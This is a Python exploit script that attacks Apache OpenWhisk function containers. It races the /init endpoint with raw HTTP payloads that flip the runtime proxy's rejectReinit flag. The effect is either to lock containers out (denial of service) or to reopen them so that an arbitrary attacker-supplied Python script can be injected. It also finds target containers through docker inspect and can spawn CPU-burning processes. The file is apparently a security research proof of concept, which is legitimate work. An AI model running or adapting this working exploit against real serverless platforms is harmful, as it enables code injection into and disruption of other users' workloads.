#!/usr/bin/env python3

import argparse
import requests
import signal
import socket
import os
import subprocess
import re
import sys
from multiprocessing import Process, Queue

## Cli argument parsing

# arguments definitions

parser = argparse.ArgumentParser(description='Python script to perform dos or injection attacks on containers in Openwhisk (NB injection mode works only on python containers)')

parser.add_argument('--mode', '-m',
        choices=['injection', 'dos'],
        default='injection', 
        type=str,
        help='select attack mode (dos, injection)'
)

parser.add_argument('--slowdown', '-s',
        default=0, 
        type=int,
        help='number of processes that will be used to slowdown the system'
)

parser.add_argument('--attackers', '-a',
        default=1, 
        type=int,
        help='number of attacking processes'
)

parser.add_argument('--ip_list', '-i',
        default='', 
        type=str,
        help='list of IPs to attack, use comma as separator'
)

parser.add_argument('--file', '-f', 
        default='', 
        type=str,
        help='python script to inject into the container'
)

args = parser.parse_args()

# arguments errors

if args.attackers <= 0:
    parser.error('--attackers must be greater than zero')

if args.slowdown < 0:
    parser.error('--slowdown must be greater or equal than zero')

if args.mode == 'dos' and args.file != '':
    parser.error('Cannot use file in dos mode')

if args.mode == 'injection' and args.file == '':
    parser.error('Please select the python script to inject')

if args.ip_list != '':
    ip_list_regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)'''

    for ip in args.ip_list.split(','):
        if not re.search(ip_list_regex, ip):
            parser.error('Invalid IP list, format must be <IP1>,<IP2>...')

if args.file != '':
    try:
        with open(args.file) as f:
            inj_action = f.read()
    except:
        parser.error('Invalid file to inject')

## Cleanup on sigint, kill all processes
def sigint_handler(sig, frame):
    for p in slow_processes:
        p.terminate()

    print("killed all slowdown processes")

    for ip in ip_targeted:
        for i in range(0, args.attackers):
            atk_processes[ip][i].terminate()

    print("killed all attacking processes")
    print("NOW TERMINATING\n\n")

    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

## Exploiting code
print("Launching the attack!")

# Launch slowdown processes if requested
slow_processes = []

def slow():
    os.system('yes 1>/dev/null') 

if args.slowdown > 0:
    for i in range(0,args.slowdown):
        slow_processes.append(Process(target=slow))
        slow_processes[i].start()
    print("Slowing processes started")

# Search target ip if ip list is not provided
ip_targeted = []

def search_target():
    ip_list = subprocess.check_output("docker ps -q | xargs -n 1 docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' | sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4", shell=True).decode("utf-8")
    base_addr = re.match(r'^([\w]+\.[\w]+\.[\w]+)\.', ip_list).group()
    i = 2
    for ip in ip_list.splitlines():
        if (re.search(r'([\w]+)$', ip).group() != str(i)):
            break
        i += 1
    ret = []
    ret.append(base_addr + str(i))
    return ret

if args.ip_list == '':
    ip_targeted = search_target()
else:
    ip_targeted = args.ip_list.split(',')

print("Target acquired")

# Launch attacking processes 
payloads = {
        'dos': b'POST /init HTTP/1.1\r\nHost: localhost:1923\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.19.1\r\nContent-Length: 179\r\nContent-Type: application/json\r\n\r\n{"value": {"main": "main", "binary": false, "code": "import sys\\nsys._getframe(3).f_globals[\'proxy\'].rejectReinit = True\\n\\ndef main(args):\\n    return {\\"\\":\\"\\"}\\n", "env": {}}}\r\n',

        'injection': b'POST /init HTTP/1.1\r\nHost: localhost:1923\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.19.1\r\nContent-Length: 180\r\nContent-Type: application/json\r\n\r\n{"value": {"main": "main", "binary": false, "code": "import sys\\nsys._getframe(3).f_globals[\'proxy\'].rejectReinit = False\\n\\ndef main(args):\\n    return {\\"\\":\\"\\"}\\n", "env": {}}}\r\n'

}

# dict that will contain the processes (useful for cleanup)
# keys: containers' ip 
# values: list that contains attcking processes for its key
atk_processes = {}

# first we read the script to inject
if (args.mode == 'injection'):
    with open(args.file, 'r') as inj_file:
        payloads['inj_action'] = inj_file.read()

# this function will be used to trigger the race condition vulnerability
# it tries to connect to the containers ip as fast as possible so that
# we can either unlock the reinit or lock the Openwhisks /init
def race(ip, mode, queue):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    while s.connect_ex((ip, 8080)) != 0:
        pass

    s.setblocking(1)
    assert s.send(payloads[mode]) == len(payloads[mode])

    timeout = 0.01
    while True:
        try:
            s.settimeout(timeout)
            queue.put({'response':s.recv(4096), 'ip':ip})
            if (mode == 'injection'):
                break
            else:
                race(ip, mode, queue)
        except:
            if timeout <= 0.1:
                timeout += 0.01
            else:
                queue.put({'response':'didnt got an answer', 'ip':ip})
                return
        
# this function will be called after a successful reinit unlock
# it basically sends a /init request to inject our script into the container
def send_init(ip):
    r = requests.post(
        'http://{}:8080/init'.format(ip),
        json = {
            "value": {
                "code": payloads['inj_action'],
                "binary": False,
                "main": 'main',
                "env": '{}'
            }
        })
    print(r.text)

# this Queue is used by the attacking processes to communicate if they have succeded
atk_result_q = Queue()

# first we launch the 'race condition' processes
for ip in ip_targeted:
    atk_processes[ip] = []
    for i in range(0,args.attackers):
        atk_processes[ip].insert(0,Process(target=race, args=(ip, args.mode, atk_result_q)))
        atk_processes[ip][0].start()
    print("{} Attacking processes started for ip {}".format(i+1, ip))

# then we read the messages in the queue and, if the race condition was successful, 
# we continue the attack
while True:
    result = atk_result_q.get()
    if 'OK' in (str(result['response'])) and args.mode == 'injection':
        print("Reinit UNLOCKED on {}, now trying to inject code".format(result['ip']))
        atk_processes[result['ip']].insert(0,Process(target=send_init, args=(result['ip'],)))
        atk_processes[result['ip']][0].start()
    elif 'OK' in (str(result['response'])) and args.mode == 'dos':
        print("Successful race condition on {}".format(result['ip']))

